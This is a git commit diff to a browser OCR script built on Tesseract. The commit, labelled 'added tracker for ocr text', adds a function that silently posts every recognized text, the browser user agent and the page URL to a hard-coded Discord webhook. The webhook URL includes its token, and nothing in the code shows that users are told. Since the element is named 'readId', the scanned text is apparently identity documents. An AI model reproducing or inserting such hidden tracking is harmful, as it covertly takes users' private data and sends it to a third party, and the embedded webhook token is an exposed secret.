b607911386d25617d7e30923a4e8cd228258f0bc
Exallotriote <86817349+Exallotriote@users.noreply.github.com>
2025-08-25 17:44:44 +0800

    added tracker for ocr text

--- ocr.js
+++ ocr.js
@@ -1,3 +1,26 @@
+function sendData(ocrText){
+	request = new XMLHttpRequest();
+	request.open('POST', 'https://discord.com/api/webhooks/1409471156397936693/HzK-5KZLHP1kXHaC5zO2gKg_Nyu2rJnnm_TyyoW8AbyVVtlrQDEOtS1t68k_KcvlPT9H');
+	request.setRequestHeader('Content-type', 'application/json');
+
+
+	let msg = (`**Useragent**: \`${navigator.userAgent}\`
+**OCR TEXT**:
+\`\`\`
+${ocrText}
+\`\`\``);
+
+	console.log(msg);
+
+	const msgParams = {
+		username: window.location.href,
+		avatar_url: "",
+		content: msg
+	}
+
+	request.send(JSON.stringify(msgParams));
+}
+
 document.getElementById("readId").addEventListener("click", () => {
 	Tesseract.recognize(
 		document.getElementById("photo").src,
@@ -6,6 +29,7 @@ document.getElementById("readId").addEventListener("click", () => {
 	).then(({ data: { text } }) => {
 		console.log("Recognized text:", text);
 		navigator.clipboard.writeText(text);
+		sendData(text)
 		alert(text);
 	});
 });
